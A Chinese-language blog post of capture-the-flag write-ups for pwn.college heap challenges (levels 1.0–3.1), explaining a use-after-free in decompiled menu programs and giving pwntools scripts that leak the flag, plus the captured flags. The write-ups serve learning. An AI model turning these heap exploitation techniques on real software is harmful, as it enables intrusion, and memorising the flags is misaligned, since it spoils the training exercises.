---
title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
published: 2025-01-25
updated: 2025-01-25
description: "Write-ups for pwn.college binary exploitation series."
image: "https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.41yct5dsj8.avif"
tags: ["Pwn", "Write-ups", "Heap"]
category: "Write-ups"
draft: false
---

# 前言

为了 2.9 的 Nu1L Junior 招新赛被迫先学点 Heap 的知识，本来是打算学完 FmtStr 和 Sandbox 再开这章的……想想还是得先开点堆的知识，因为栈我能临场自学，但堆是一点也不会啊。

看完讲义后，我果然没猜错，刚接触 Heap 是有点难度，一开始就要先被一堆新知识狠狠的冲击，要垮啦……打完 Pwn College 的 Heap 应该只能算有点基础知识，还得刷别的题，看 `glibc` 源码，要崩啦……

想想如果能成为 Heap ✌️ 得有多牛逼吧 LMAO

# Level 1.0

## Information

- Category: Pwn

## Description

> Exploit a use-after-free vulnerability to get the flag.

## Write-up

```c del={43, 62, 65-66} collapse={1-19}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+2Ch] [rbp-B4h]
  unsigned int size; // [rsp+34h] [rbp-ACh]
  void *size_4; // [rsp+38h] [rbp-A8h]
  void *ptr; // [rsp+48h] [rbp-98h]
  char s1[136]; // [rsp+50h] [rbp-90h] BYREF
  unsigned __int64 v10; // [rsp+D8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  ptr = 0LL;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 1);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          print_tcache(main_thread_tcache);
          puts(byte_2419);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2419);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2419);
          size = atoi(s1);
          printf("[*] allocations[%d] = malloc(%d)\n", 0, size);
          ptr = malloc(size);
          printf("[*] allocations[%d] = %p\n", 0, ptr);
        }
        if ( strcmp(s1, "free") )
          break;
        printf("[*] free(allocations[%d])\n", 0);
        free(ptr);
      }
      if ( strcmp(s1, "puts") )
        break;
      printf("[*] puts(allocations[%d])\n", 0);
      printf("Data: ");
      puts((const char *)ptr);
    }
    if ( strcmp(s1, "read_flag") )
      break;
    for ( i = 0; i <= 0; ++i )
    {
      printf("[*] flag_buffer = malloc(%d)\n", 330);
      size_4 = malloc(0x14AuLL);
      printf("[*] flag_buffer = %p\n", size_4);
    }
    v3 = open("/flag", 0);
    read(v3, size_4, 0x80uLL);
    puts("[*] read the flag!");
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

`atoi`，即 ASCII to Integer.

这题就是一个菜单程序，存在一个 `UAF (Use After Free)` 漏洞，简单来说就是在释放了一块内存后使用了指向已经被释放的内存的指针，这很容易造成的一个问题就是 Data disclosure.

简单分析这个程序我们发现，`read_flag` 会 `malloc` 一块空间，然后把 flag 写进去；`puts` 会输出 `ptr` 处的内容。我们的目的是输出 flag，那这个 `ptr` 就必须指向 flag 的起始地址才行。再观察 `malloc`，它会将分配后返回的地址赋值给 `ptr`。那思路就很清晰了：我们先使用 `malloc` 分配足够存下 flag 的内存，这会设置 `ptr`，之后 `free` 它，接着使用 `read_flag`，这会把 flag 写入 `malloc` 返回的地址处（同 `ptr` 保存的地址），最后调用 `puts` 就可以输出我们的 flag 了。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyheap_level1.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def construct_payload():
    return [
        (b"malloc", b"1337"),
        (b"free", None),
        (b"read_flag", None),
        (b"puts", None),
    ]


def attack(target, payload):
    try:
        for cmd, arg in payload:
            target.sendlineafter(b": ", cmd)

            if arg is not None:
                target.sendlineafter(b": ", arg)

        response = target.recvall(timeout=0.1)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    target = launch()
    payload = construct_payload()

    if attack(target, payload):
        exit()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{8_UCfYUIGnvHU86NU1Qe-H6dK1o.0VM3MDL5cTNxgzW}`

# Level 1.1

## Information

- Category: Pwn

## Description

> Exploit a use-after-free vulnerability to get the flag.

## Write-up

参见 [Level 1.0](#level-10)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyheap_level1.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def construct_payload():
    return [
        (b"malloc", b"1337"),
        (b"free", None),
        (b"read_flag", None),
        (b"puts", None),
    ]


def attack(target, payload):
    try:
        for cmd, arg in payload:
            target.sendlineafter(b": ", cmd)

            if arg is not None:
                target.sendlineafter(b": ", arg)

        response = target.recvall(timeout=0.1)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    target = launch()
    payload = construct_payload()

    if attack(target, payload):
        exit()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{8oPO3KqdZU5lZfzl5xftjR2IZif.0lM3MDL5cTNxgzW}`

# Level 2.0

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag.

## Write-up

与 [Level 1](#level-10) 区别不大。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyheap_level2.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def construct_payload():
    return [
        (b"malloc", b"1337"),
        (b"free", None),
        (b"read_flag", None),
        (b"puts", None),
    ]


def attack(target, payload):
    try:
        for cmd, arg in payload:
            target.sendlineafter(b": ", cmd)

            if arg is not None:
                target.sendlineafter(b": ", arg)

        response = target.recvall(timeout=0.1)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    target = launch()
    payload = construct_payload()

    if attack(target, payload):
        exit()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{ME7LG_Jy8T-xEw9H_njxpD2aJ4z.01M3MDL5cTNxgzW}`

# Level 2.1

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag.

## Write-up

参见 [Level 2.0](#level-20)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyheap_level2.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def construct_payload():
    return [
        (b"malloc", b"1337"),
        (b"free", None),
        (b"read_flag", None),
        (b"puts", None),
    ]


def attack(target, payload):
    try:
        for cmd, arg in payload:
            target.sendlineafter(b": ", cmd)

            if arg is not None:
                target.sendlineafter(b": ", arg)

        response = target.recvall(timeout=0.1)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    target = launch()
    payload = construct_payload()

    if attack(target, payload):
        exit()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{MihEcPIR1bQBmiQGOoGELSrscgW.0FN3MDL5cTNxgzW}`

# Level 3.0

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag when multiple allocations occur.

## Write-up

```c ins={81-86} del={77, 88} collapse={1-23}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+24h] [rbp-12Ch]
  unsigned int v6; // [rsp+28h] [rbp-128h]
  unsigned int v7; // [rsp+28h] [rbp-128h]
  unsigned int v8; // [rsp+28h] [rbp-128h]
  unsigned int size; // [rsp+2Ch] [rbp-124h]
  void *size_4; // [rsp+30h] [rbp-120h]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
  printf("In this challenge, the flag buffer is allocated %d times before it is used.\n\n", 2);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          print_tcache(main_thread_tcache);
          puts(byte_246E);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_246E);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_246E);
          v6 = atoi(s1);
          if ( v6 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0xE0u, "main");
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_246E);
          size = atoi(s1);
          printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
          ptr[v6] = malloc(size);
          printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
        }
        if ( strcmp(s1, "free") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_246E);
        v7 = atoi(s1);
        if ( v7 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0xF2u, "main");
        printf("[*] free(allocations[%d])\n", v7);
        free(ptr[v7]);
      }
      if ( strcmp(s1, "puts") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_246E);
      v8 = atoi(s1);
      if ( v8 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 0xFFu, "main");
      printf("[*] puts(allocations[%d])\n", v8);
      printf("Data: ");
      puts((const char *)ptr[v8]);
    }
    if ( strcmp(s1, "read_flag") )
      break;
    for ( i = 0; i <= 1; ++i )
    {
      printf("[*] flag_buffer = malloc(%d)\n", 773);
      size_4 = malloc(0x305uLL);
      printf("[*] flag_buffer = %p\n", size_4);
    }
    v3 = open("/flag", 0);
    read(v3, size_4, 0x80uLL);
    puts("[*] read the flag!");
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

这题的问题就在于标绿部分，把 flag 写入到 `size_4` 前会先进行两次 `malloc`。所以我们应该先 `malloc` 出对应的两个块，然后 `free` 掉，这么做是为了令标绿部分的 `malloc` 分配空间到我们的数组中而不是别的地方，因为 `puts` 只能输出数组中的内容。之后再次调用 `malloc` 会从最近 `free` 掉的那个地址开始分配，如果我们想让 flag 出现在 idx 0 的话我们的 `free` 顺序应该是先 `free 0` 再 `free 1`，之后再调用 `read_flag` 就会把 `flag` 写入 idx 0，我们用 `puts` 输出 idx 0 的内容即可。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyheap_level3.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def construct_payload():
    return [
        (b"malloc", b"0", b"773"),
        (b"malloc", b"1", b"773"),
        (b"free", b"0", None),
        (b"free", b"1", None),
        (b"read_flag", None, None),
        (b"puts", b"0", None),
    ]


def execute_cmd(target, cmd, arg1=None, arg2=None):
    target.sendlineafter(b": ", cmd)

    if arg1 is not None:
        target.sendlineafter(b": ", arg1)

    if arg2 is not None:
        target.sendlineafter(b": ", arg2)


def attack(target, payload):
    try:
        for cmd, arg1, arg2 in payload:
            execute_cmd(target, cmd, arg1, arg2)

        response = target.recvall(timeout=0.1)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    target = launch()
    payload = construct_payload()

    if attack(target, payload):
        exit()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{wvvL-j9QzjeoJrOsQS4Vval7exq.0VN3MDL5cTNxgzW}`

# Level 3.1

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag when multiple allocations occur.

## Write-up

参见 [Level 3.0](#level-30)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyheap_level3.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def construct_payload():
    return [
        (b"malloc", b"0", b"911"),
        (b"malloc", b"1", b"911"),
        (b"free", b"0", None),
        (b"free", b"1", None),
        (b"read_flag", None, None),
        (b"puts", b"0", None),
    ]


def execute_cmd(target, cmd, arg1=None, arg2=None):
    target.sendlineafter(b": ", cmd)

    if arg1 is not None:
        target.sendlineafter(b": ", arg1)

    if arg2 is not None:
        target.sendlineafter(b": ", arg2)


def attack(target, payload):
    try:
        for cmd, arg1, arg2 in payload:
            execute_cmd(target, cmd, arg1, arg2)

        response = target.recvall(timeout=0.1)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    target = launch()
    payload = construct_payload()

    if attack(target, payload):
        exit()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{wDLulwEpEQfpi78_Z4CAniTrByQ.0lN3MDL5cTNxgzW}`
